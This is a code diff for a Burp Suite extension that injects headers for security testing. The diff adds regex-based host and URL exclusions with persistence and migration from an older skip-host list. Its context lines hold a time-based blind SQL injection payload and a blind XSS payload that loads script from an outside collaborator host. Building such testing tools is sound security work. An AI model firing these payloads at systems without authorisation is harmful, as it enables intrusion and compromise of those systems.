@@ -43,7 +43,8 @@ public class BurpHeaderBanger implements BurpExtension {
     private List<String> sensitiveHeaders = new ArrayList<>();
     private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
     private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
-    private List<String> skipHosts = new ArrayList<>();
+    private List<String> skipHosts = new ArrayList<>(); // Legacy support - to be removed after migration
+    private List<Exclusion> exclusions = new ArrayList<>();
     private List<String> injectedHeaders = new ArrayList<>();
     private List<String> extraHeaders = new ArrayList<>();
     private boolean allowDuplicateHeaders = true; // true = allow duplicate headers, false = add only if not exists
@@ -79,6 +80,12 @@ public class BurpHeaderBanger implements BurpExtension {
     
     private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
             "player.vimeo.com", "example3.com"
+    );
+    
+    // Default exclusions (regex patterns)
+    private static final List<Exclusion> DEFAULT_EXCLUSIONS = Arrays.asList(
+            new Exclusion(true, "player\\.vimeo\\.com", true),
+            new Exclusion(true, "example3\\.com", true)
     );
 
     @Override
@@ -248,12 +255,36 @@ public class BurpHeaderBanger implements BurpExtension {
             sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
         }
         
-        // Load skip hosts
+        // Load skip hosts (legacy support)
         String skipHostsJson = persistedObject.getString("skipHosts");
         if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
             skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
         } else {
             skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
+        }
+        
+        // Load exclusions
+        String exclusionsJson = persistedObject.getString("exclusions");
+        if (exclusionsJson != null && !exclusionsJson.isEmpty()) {
+            exclusions = new ArrayList<>();
+            String[] exclusionStrings = exclusionsJson.split("\\|\\|");
+            for (String exclusionString : exclusionStrings) {
+                if (!exclusionString.trim().isEmpty()) {
+                    exclusions.add(Exclusion.fromJson(exclusionString));
+                }
+            }
+        } else {
+            // Migrate from old skipHosts or use defaults
+            exclusions = new ArrayList<>();
+            if (!skipHosts.isEmpty()) {
+                // Migrate from old skipHosts format
+                for (String host : skipHosts) {
+                    exclusions.add(new Exclusion(true, host, false));
+                }
+            } else {
+                // Use default exclusions
+                exclusions = new ArrayList<>(DEFAULT_EXCLUSIONS);
+            }
         }
         
         // Load payloads
@@ -305,8 +336,15 @@ public class BurpHeaderBanger implements BurpExtension {
         // Save sensitive headers
         persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
         
-        // Save skip hosts
+        // Save skip hosts (legacy support)
         persistedObject.setString("skipHosts", String.join(",", skipHosts));
+        
+        // Save exclusions
+        List<String> exclusionJsonList = new ArrayList<>();
+        for (Exclusion exclusion : exclusions) {
+            exclusionJsonList.add(exclusion.toJson());
+        }
+        persistedObject.setString("exclusions", String.join("||", exclusionJsonList));
         
         // Save payloads
         persistedObject.setString("sqliPayload", sqliPayload);
@@ -355,6 +393,9 @@ public class BurpHeaderBanger implements BurpExtension {
     public List<String> getSkipHosts() { return skipHosts; }
     public void setSkipHosts(List<String> skipHosts) { this.skipHosts = skipHosts; }
 
+    public List<Exclusion> getExclusions() { return exclusions; }
+    public void setExclusions(List<Exclusion> exclusions) { this.exclusions = exclusions; }
+
     public List<String> getInjectedHeaders() { return injectedHeaders; }
     public void setInjectedHeaders(List<String> injectedHeaders) { this.injectedHeaders = injectedHeaders; }
 
@@ -374,9 +415,34 @@ public class BurpHeaderBanger implements BurpExtension {
 
     public List<String> getDefaultHeaders() { return new ArrayList<>(DEFAULT_HEADERS); }
     public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }
+    public List<Exclusion> getDefaultExclusions() { return new ArrayList<>(DEFAULT_EXCLUSIONS); }
 
     public Map<String, Long> getRequestTimestamps() { return requestTimestamps; }
     public Map<String, PayloadCorrelation> getPayloadMap() { return payloadMap; }
+    
+    // Exclusion methods
+    public boolean isExcluded(String url, String host) {
+        for (Exclusion exclusion : exclusions) {
+            if (exclusion.matches(url) || exclusion.matches(host)) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    public void addExclusion(String pattern, boolean isRegex) {
+        exclusions.add(new Exclusion(true, pattern, isRegex));
+    }
+    
+    public void addHostExclusion(String host) {
+        // Add as literal pattern for host exclusion
+        exclusions.add(new Exclusion(true, host, false));
+    }
+    
+    public void addUrlExclusion(String url) {
+        // Add as literal pattern for URL exclusion
+        exclusions.add(new Exclusion(true, url, false));
+    }
 
     public void extractSqliSleepTime() {
         // Extract sleep time from SQL injection payload
